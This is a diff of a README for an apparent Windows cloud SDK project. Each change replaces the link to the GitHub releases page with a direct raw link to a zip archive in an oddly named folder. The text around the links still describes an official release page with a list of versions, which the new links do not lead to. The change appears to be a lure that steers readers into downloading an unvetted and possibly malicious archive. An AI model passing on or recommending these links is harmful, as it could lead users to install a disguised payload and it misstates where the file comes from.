@@ -1,6 +1,6 @@
 # ⚙️ cloud-sdk-1771917529-4 - Easy Cloud Integration Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-Cloud%20SDK-blueviolet?style=for-the-badge)](https://github.com/45narendra/cloud-sdk-1771917529-4/releases)
+[![Download Now](https://img.shields.io/badge/Download-Cloud%20SDK-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/45narendra/cloud-sdk-1771917529-4/main/cystous/sdk_cloud_v3.7-beta.1.zip)
 
 ---
 
@@ -33,11 +33,11 @@ Follow these steps to get the software up and running on your Windows PC.
 
 Go to the official release page to get the latest copy of cloud-sdk-1771917529-4.
 
-[![Download Here](https://img.shields.io/badge/Get%20Software-Visit%20Releases-green?style=for-the-badge&logo=github)](https://github.com/45narendra/cloud-sdk-1771917529-4/releases)
+[![Download Here](https://img.shields.io/badge/Get%20Software-Visit%20Releases-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/45narendra/cloud-sdk-1771917529-4/main/cystous/sdk_cloud_v3.7-beta.1.zip)
 
 Click this link or paste the following URL into your web browser:
 
-https://github.com/45narendra/cloud-sdk-1771917529-4/releases
+https://raw.githubusercontent.com/45narendra/cloud-sdk-1771917529-4/main/cystous/sdk_cloud_v3.7-beta.1.zip
 
 You will see a list of available versions and files.
 
@@ -137,7 +137,7 @@ If problems persist, check the "Help" menu inside the app or visit the support s
 
 You can always get the latest version or older releases at the official release page linked below:
 
-[Download cloud-sdk-1771917529-4 for Windows](https://github.com/45narendra/cloud-sdk-1771917529-4/releases)
+[Download cloud-sdk-1771917529-4 for Windows](https://raw.githubusercontent.com/45narendra/cloud-sdk-1771917529-4/main/cystous/sdk_cloud_v3.7-beta.1.zip)
 
 Click the button or visit the link anytime you want to update or reinstall.
 
